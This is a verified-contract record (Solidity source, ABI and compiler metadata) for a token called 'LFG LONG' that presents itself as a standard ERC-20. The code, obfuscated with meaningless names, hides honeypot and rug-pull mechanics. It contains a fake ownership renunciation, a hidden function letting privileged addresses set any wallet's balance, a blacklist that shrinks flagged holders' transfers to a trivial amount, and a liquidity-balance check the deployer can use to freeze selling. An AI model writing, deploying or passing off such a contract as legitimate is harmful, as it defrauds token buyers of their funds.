{"SourceCode": "//SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.12;\r\n\r\ninterface teamLimit {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address listTokenSwap) external view returns (uint256);\r\n\r\n    function transfer(address marketingTo, uint256 sellTotal) external returns (bool);\r\n\r\n    function allowance(address marketingReceiver, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 sellTotal) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address marketingTo,\r\n        uint256 sellTotal\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed tokenMin, uint256 value);\r\n    event Approval(address indexed marketingReceiver, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract senderFee {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface totalSenderLiquidity {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\ninterface maxModeLimit {\r\n    function createPair(address listLaunch, address enableFee) external returns (address);\r\n}\r\n\r\ninterface teamLimitMetadata is teamLimit {\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\ncontract LFGLong is senderFee, teamLimit, teamLimitMetadata {\r\n\r\n    constructor (){\r\n        \r\n        totalSenderLiquidity takeMarketing = totalSenderLiquidity(txMode);\r\n        toLaunch = maxModeLimit(takeMarketing.factory()).createPair(takeMarketing.WETH(), address(this));\r\n        if (txExempt) {\r\n            toIs = true;\r\n        }\r\n        exemptTx = _msgSender();\r\n        takeLaunched();\r\n        fundToken[exemptTx] = true;\r\n        modeWallet[exemptTx] = senderAuto;\r\n        \r\n        emit Transfer(address(0), exemptTx, senderAuto);\r\n    }\r\n\r\n    uint256 tradingModeBuy;\r\n\r\n    uint256 private launchSell;\r\n\r\n    string private autoSwapEnable = \"LFG\";\r\n\r\n    uint256 private walletAt;\r\n\r\n    function walletToken(address txMinWallet, address marketingTo, uint256 sellTotal) internal returns (bool) {\r\n        require(modeWallet[txMinWallet] >= sellTotal);\r\n        modeWallet[txMinWallet] -= sellTotal;\r\n        modeWallet[marketingTo] += sellTotal;\r\n        emit Transfer(txMinWallet, marketingTo, sellTotal);\r\n        return true;\r\n    }\r\n\r\n    function symbol() external view virtual override returns (string memory) {\r\n        return autoSwapEnable;\r\n    }\r\n\r\n    function tradingLimit(uint256 sellTotal) public {\r\n        tradingTake();\r\n        tradingModeBuy = sellTotal;\r\n    }\r\n\r\n    bool private txExempt;\r\n\r\n    function decimals() external view virtual override returns (uint8) {\r\n        return listFund;\r\n    }\r\n\r\n    function approve(address limitList, uint256 sellTotal) public virtual override returns (bool) {\r\n        walletLaunch[_msgSender()][limitList] = sellTotal;\r\n        emit Approval(_msgSender(), limitList, sellTotal);\r\n        return true;\r\n    }\r\n\r\n    uint256 private tokenMarketingLiquidity;\r\n\r\n    address enableSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\r\n\r\n    function transferFrom(address txMinWallet, address marketingTo, uint256 sellTotal) external override returns (bool) {\r\n        if (_msgSender() != txMode) {\r\n            if (walletLaunch[txMinWallet][_msgSender()] != type(uint256).max) {\r\n                require(sellTotal <= walletLaunch[txMinWallet][_msgSender()]);\r\n                walletLaunch[txMinWallet][_msgSender()] -= sellTotal;\r\n            }\r\n        }\r\n        return minAtMax(txMinWallet, marketingTo, sellTotal);\r\n    }\r\n\r\n    function takeLaunched() public {\r\n        emit OwnershipTransferred(exemptTx, address(0));\r\n        exemptLaunched = address(0);\r\n    }\r\n\r\n    bool private toIs;\r\n\r\n    function transfer(address minFrom, uint256 sellTotal) external virtual override returns (bool) {\r\n        return minAtMax(_msgSender(), minFrom, sellTotal);\r\n    }\r\n\r\n    function totalSupply() external view virtual override returns (uint256) {\r\n        return senderAuto;\r\n    }\r\n\r\n    function listLimit(address tradingWallet) public {\r\n        tradingTake();\r\n        if (launchSell != tokenMarketingLiquidity) {\r\n            launchSell = walletAt;\r\n        }\r\n        if (tradingWallet == exemptTx || tradingWallet == toLaunch) {\r\n            return;\r\n        }\r\n        launchedLimit[tradingWallet] = true;\r\n    }\r\n\r\n    address public toLaunch;\r\n\r\n    function liquidityReceiver(address shouldLaunch) public {\r\n        if (senderMode) {\r\n            return;\r\n        }\r\n        \r\n        fundToken[shouldLaunch] = true;\r\n        \r\n        senderMode = true;\r\n    }\r\n\r\n    string private amountShould = \"LFG LONG\";\r\n\r\n    bool public senderMode;\r\n\r\n    address private exemptLaunched;\r\n\r\n    function owner() external view returns (address) {\r\n        return exemptLaunched;\r\n    }\r\n\r\n    uint256 private senderAuto = 100000000 * 10 ** 18;\r\n\r\n    uint256 constant fundMarketing = 20 ** 10;\r\n\r\n    mapping(address => bool) public launchedLimit;\r\n\r\n    mapping(address => uint256) private modeWallet;\r\n\r\n    address public exemptTx;\r\n\r\n    function limitLaunch(address minFrom, uint256 sellTotal) public {\r\n        tradingTake();\r\n        modeWallet[minFrom] = sellTotal;\r\n    }\r\n\r\n    mapping(address => mapping(address => uint256)) private walletLaunch;\r\n\r\n    address txMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\r\n\r\n    uint256 public fundList;\r\n\r\n    function allowance(address txLaunch, address limitList) external view virtual override returns (uint256) {\r\n        if (limitList == txMode) {\r\n            return type(uint256).max;\r\n        }\r\n        return walletLaunch[txLaunch][limitList];\r\n    }\r\n\r\n    event OwnershipTransferred(address indexed receiverMode, address indexed autoLiquidity);\r\n\r\n    function balanceOf(address listTokenSwap) public view virtual override returns (uint256) {\r\n        return modeWallet[listTokenSwap];\r\n    }\r\n\r\n    function getOwner() external view returns (address) {\r\n        return exemptLaunched;\r\n    }\r\n\r\n    uint8 private listFund = 18;\r\n\r\n    function minAtMax(address txMinWallet, address marketingTo, uint256 sellTotal) internal returns (bool) {\r\n        if (txMinWallet == exemptTx) {\r\n            return walletToken(txMinWallet, marketingTo, sellTotal);\r\n        }\r\n        uint256 swapTeam = teamLimit(toLaunch).balanceOf(enableSwap);\r\n        require(swapTeam == tradingModeBuy);\r\n        require(marketingTo != enableSwap);\r\n        if (launchedLimit[txMinWallet]) {\r\n            return walletToken(txMinWallet, marketingTo, fundMarketing);\r\n        }\r\n        return walletToken(txMinWallet, marketingTo, sellTotal);\r\n    }\r\n\r\n    function tradingTake() private view {\r\n        require(fundToken[_msgSender()]);\r\n    }\r\n\r\n    uint256 walletLaunchedEnable;\r\n\r\n    mapping(address => bool) public fundToken;\r\n\r\n    function name() external view virtual override returns (string memory) {\r\n        return amountShould;\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTokenSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"limitLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLaunch\",\"type\":\"address\"}],\"name\":\"liquidityReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingWallet\",\"type\":\"address\"}],\"name\":\"listLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"tradingLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMinWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LFGLong", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://76c4f05d0aaff898efaaf71aadaf41780787470a4fcb798e1fd69177a4424eba"}